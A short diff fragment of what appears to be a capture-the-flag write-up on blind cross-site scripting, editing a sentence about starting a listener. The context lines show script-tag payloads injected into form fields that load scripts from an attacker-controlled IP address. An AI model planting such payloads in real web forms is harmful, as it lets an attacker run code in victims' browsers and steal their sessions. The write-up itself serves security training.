@@ -50,8 +50,7 @@ password
 jj@gmail.com><script src="http://10.10.14.88/email"></script>
 <script src="http://10.10.14.88/imgurl"></script>
 ```
-
-We can also start our listener (note we don't need the field names, but just for good practice).
+(note we don't need the field names, but just for good practice).
 
 Seems like the email format is wrong, so that should eliminate another field that is potentially not vulnerable.
 
